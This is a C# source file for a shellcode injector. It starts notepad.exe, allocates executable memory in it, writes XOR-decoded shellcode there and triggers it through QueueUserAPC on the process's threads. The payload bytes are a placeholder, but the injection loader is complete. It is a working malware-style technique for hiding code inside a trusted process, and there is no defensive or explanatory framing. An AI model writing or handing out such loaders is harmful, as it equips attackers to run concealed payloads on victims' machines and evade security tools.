using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class ShellcodeInjector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint THREAD_SET_CONTEXT = 0x0010;

    static void Main()
    {
        byte[] encryptedShellcode = new byte[] { /* encrypted shellcode */ };

        byte[] key = new byte[] { 0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6, 0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C };

        byte[] shellcode = EncryptDecrypt(encryptedShellcode, key);

        Process targetProcess = Process.Start("notepad.exe");
        targetProcess.WaitForInputIdle();

        IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);

        IntPtr allocMemAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        int bytesWritten;
        WriteProcessMemory(processHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

        // QueueUserAPC to inject shellcode
        foreach (ProcessThread thread in targetProcess.Threads)
        {
            IntPtr threadHandle = OpenThread(THREAD_SET_CONTEXT, false, (uint)thread.Id);
            if (threadHandle != IntPtr.Zero)
            {
                QueueUserAPC(allocMemAddress, threadHandle, IntPtr.Zero);
            }
        }
    }

    private static byte[] EncryptDecrypt(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }
}
